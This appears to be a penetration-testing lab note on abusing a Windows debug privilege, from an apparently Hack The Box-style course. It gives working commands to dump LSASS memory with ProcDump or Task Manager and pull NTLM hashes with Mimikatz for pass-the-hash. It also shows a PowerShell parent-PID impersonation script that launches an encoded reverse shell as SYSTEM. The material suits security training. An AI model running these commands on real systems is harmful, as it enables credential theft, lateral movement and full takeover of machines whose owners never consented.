We can do 2 things
- Dumping credentials from lsass
- RCE as SYSTEM

---
## Dumping credentials
We can use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) suite to leverage this privilege and dump process memory. A good candidate is the Local Security Authority Subsystem Service ([LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)) process, which stores user credentials after a user logs on to a system.
```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
we can load this in `Mimikatz` using the `sekurlsa::minidump` command. After issuing the `sekurlsa::logonPasswords` commands, we gain the NTLM hash of the local administrator account logged on locally. Then we can do pass-the-hash.
```
C:\htb> mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

---

Suppose we are unable to load tools on the target for whatever reason but have RDP access. In that case, we can take a manual memory dump of the `LSASS` process via the Task Manager by browsing to the `Details` tab, choosing the `LSASS` process, and selecting `Create dump file`. After downloading this file back to our attack system, we can process it using Mimikatz the same way as the previous example.

![[Z Assets/Images/ad6972e7a5eb3717e11d39544d881cc8_MD5.png]]

---
## Remote Code Execution as SYSTEM
First, open an elevated PowerShell console, type `tasklist` to get a listing of running processes and accompanying PIDs. Here we can target `winlogon.exe` running under PID 612, which we know runs as SYSTEM on Windows hosts.
```
tasklist
Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============

winlogon.exe                   612 Console                    1     10,408 K
```

First, transfer this [PoC script](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) over to the target system. and use `ppid` for a process that runs as `SYSTEM` like `lssas`. 
```powershell

. .\psgetsys.ps1
ImpersonateFromParentPid -ppid 688 -command "C:\windows\system32\cmd.exe" -cmdargs '/c "powershell -e REVERSE_SHELL"'
```